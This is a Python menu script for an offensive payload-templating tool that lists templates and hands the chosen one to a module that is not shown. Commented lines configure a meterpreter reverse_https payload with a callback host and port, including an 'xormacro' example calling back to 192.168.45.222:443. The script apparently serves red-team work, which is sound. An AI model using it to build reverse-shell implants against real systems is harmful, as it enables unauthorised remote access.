#!/usr/bin/python
import argparse
import ep_templater
import os
import json

def LoadTemplateList():
    #try:
        result = {}
        all_files = os.listdir("templates/")
        txt_files = [os.path.splitext(file)[0] for file in all_files if file.endswith('.json')]
    
        for file in txt_files:
            with open("templates/"+file+".json", "r") as templateFile:
                try:
                    template = json.load(templateFile)
                except json.JSONDecodeError as e:
                    print(f"Error decoding JSON file: {templateFile.name}. Continuing.")
                    continue
            description = ""
            if "description" in template:
                description = template["description"]
            
            result[f"{file}"] = description

    #except Exception as e:
    #    print("Problem loading template folder exiting.")
    #    print(e)
    #    exit()
    
        return result 
    
def main():
    #parser = argparse.ArgumentParser()
    #parser.add_argument('-t', '--template', default="", help="Name of the template.")
    #parser.add_argument('-p', '--payload', default="", help="MSFVenom payload eg. windows/x64/meterpreter/reverse_https")
    #parser.add_argument('-l', '--lhost',default="", help="Host to call back to.")
    #parser.add_argument('-s', '--lport',default="", help="Port to call back to")
    #parser.add_argument('-o', '--outraw', default="", help="Output the uncompiled code here.")
    #args = parser.parse_args()
    
    title = """
                .__                                       
  ____  ______  |  |__    ____    ____    ____    _____   
_/ __ \ \____ \ |  |  \ _/ __ \  /    \  /  _ \  /     \  
\  ___/ |  |_> >|   Y  \\  ___/ |   |  \(  <_> )|  Y Y  \ 
 \___  >|   __/ |___|  / \___  >|___|  / \____/ |__|_|  / 
     \/ |__|         \/      \/      \/               \/  
     
     by yellephen.
     """
    
    print(title)


    goodCommand = False
    while goodCommand == False:

        print("Enter [list] to show templates or text search template names with eg. [list exe]")
        print("Get the template number and enter eg. [use 2] to get started.")


        command = input()

        if command == "list":
            loadedTemplateList = LoadTemplateList()

        elif command.startswith("list "):
            loadedTemplateList = {}
            search = command.split(" ")[1]
            allTemplates = LoadTemplateList()
            for key, value in allTemplates.items():
                if search.lower() in key.lower():
                    loadedTemplateList[key] = value
                        
        for index, (key, value) in enumerate(loadedTemplateList.items()):
            print(f"{index}. {key}, {value}")
        
        command = input()

        if command.startswith("use "):
            try:
                index = int(command.split(" ")[1])
                goodCommand = True
            except:
                print("Error in input. Try again.")
                continue
            
            keys_list = list(loadedTemplateList.keys())
            template = keys_list[index]
        else:
            print("Bad input, back to the start.")
            continue
                        
        ep_templater.FillTemplate(template)

        
if __name__ == "__main__":
    main()



    #ep_templater.FillTemplate("xormacro","windows/meterpreter/reverse_https", "192.168.45.222", "443")
    